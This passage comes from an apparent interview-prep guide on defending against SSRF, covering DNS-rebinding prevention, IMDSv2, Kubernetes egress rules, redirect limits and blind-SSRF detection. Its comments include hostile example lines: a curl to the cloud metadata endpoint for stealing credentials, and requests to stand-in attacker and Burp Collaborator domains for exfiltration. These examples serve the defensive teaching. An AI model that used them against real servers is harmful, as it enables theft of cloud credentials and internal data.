#   4. Between validation and request, attacker changes DNS to PRIVATE IP (10.0.0.1)
#   5. Application makes request to private IP — BYPASSED!

# Prevention: Resolve + validate + request with a SINGLE connection

def fetch_with_rebind_protection(url: str):
    """
    Resolve, validate, and connect in one go — no window for DNS rebinding
    """
    parsed = urlparse(url)

    # Use socket.create_connection with the explicit IP
    # (bypasses DNS resolution at the HTTP layer)
    ip = socket.gethostbyname(parsed.hostname)
    validate_ip(ip)

    # Connect to the IP directly, not the hostname
    # Set Host header to the original hostname
    conn = http.client.HTTPSConnection(ip, timeout=5)
    conn.request(
        "GET",
        parsed.path or "/",
        headers={"Host": parsed.hostname}  # Original hostname for virtual hosting
    )
    return conn.getresponse()
```

**Defense Layer 3: Network Architecture**

```yaml
# Never allow application servers direct access to cloud metadata!

# Architecture change:
#   ❌ Before: App server → direct outbound internet access
#       App server can reach 169.254.169.254 (metadata endpoint)
#
#   ✅ After: App server → outbound proxy (with SSRF filtering)
#       App server has NO direct internet access
#       All outbound requests go through a proxy with allowlist rules

# AWS: Use VPC endpoints + IMDSv2
#
# IMDSv2 (Instance Metadata Service Version 2):
#   - Requires session token (PUT request first, then GET with token)
#   - Token is bound to the instance, not the network
#   - Single-hop: TTL=1 prevents forwarding
#   - Makes SSRF exploitation MUCH harder
#   
#   # Enable IMDSv2 and require token:
#   # aws ec2 modify-instance-metadata-options \
#   #     --instance-id i-1234567890abcdef0 \
#   #     --http-tokens required \
#   #     --http-put-response-hop-limit 1
#
#   # Without IMDSv2: SSRF → curl 169.254.169.254/latest/meta-data/
#   # With IMDSv2:    SSRF → must first PUT to get token (harder to exploit)

# AWS: Use VPC Endpoints for AWS Services
#   - S3 VPC Endpoint: s3.amazonaws.com routes through VPC, not internet
#   - Never give EC2 instances IAM roles that can access the internet
#   - Use private DNS + VPC endpoints for S3, DynamoDB, etc.

# Kubernetes: Network Policies
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress-metadata
spec:
  podSelector:
    matchLabels:
      app: my-service
  policyTypes:
    - Egress
  egress:
    # Allow outbound only to specific CIDRs
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32  # BLOCKED
              - 169.254.170.2/32    # ECS metadata
              - 10.0.0.0/8          # Private IPs
              - 172.16.0.0/12
              - 192.168.0.0/16
```

**Defense Layer 4: Disable Unnecessary Features**

```python
# Disable HTTP redirect following (default in many HTTP clients follows redirects)
# Attacker: example.com → internal-service.internal/delete-all

# Python requests:
session = requests.Session()
session.max_redirects = 0  # Don't follow redirects at all
# Or validate each redirect target (as shown above)

# Disable support for uncommon protocols:
# Block: file://, ftp://, gopher://, dict:// (historically used for SSRF)
# Allow: https:// only

# Disable HTTP methods that could be abused:
# Use GET/HEAD only for outbound requests

# Timeouts — ALWAYS set timeouts:
# No timeout = attacker can make your server hang forever
```

**Blind SSRF Detection:**

```python
# Blind SSRF = attacker can't see the response, but can trigger side effects
# Detection through out-of-band techniques:

# 1. Attacker makes server request to attacker-controlled domain
#    GET http://attacker-controlled.com
#    → Attacker sees the request in their logs (confirms SSRF)

# 2. Attacker uses DNS exfiltration
#    GET http://secret-metadata.attacker.burpcollaborator.net
#    → DNS query leaks to attacker's DNS server

def detect_ssrf_probes():
    """Log and alert on suspicious outbound requests"""
    # Log all outbound HTTP requests with metadata
    # Alert on:
    #   - Requests to unknown domains
    #   - Requests containing metadata endpoints in URL
    #   - Requests from user-input URLs
    #   - Requests to IPs in private ranges
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **DNS rebinding** | Understands the attack and how to prevent it (resolve + validate in one call) |
| **Multi-layer defense** | Covers app code, network architecture, and cloud config |
| **IMDSv2** | Knows about AWS metadata service hardening (session tokens, TTL=1) |
| **Blind SSRF** | Mentions detection through out-of-band / DNS exfiltration techniques |

---

> *All 10 questions now provide full code examples, attack scenarios, and evaluation rubrics at staff-engineer depth. For complementary resources, see the [cs-interview README](../README.md).*
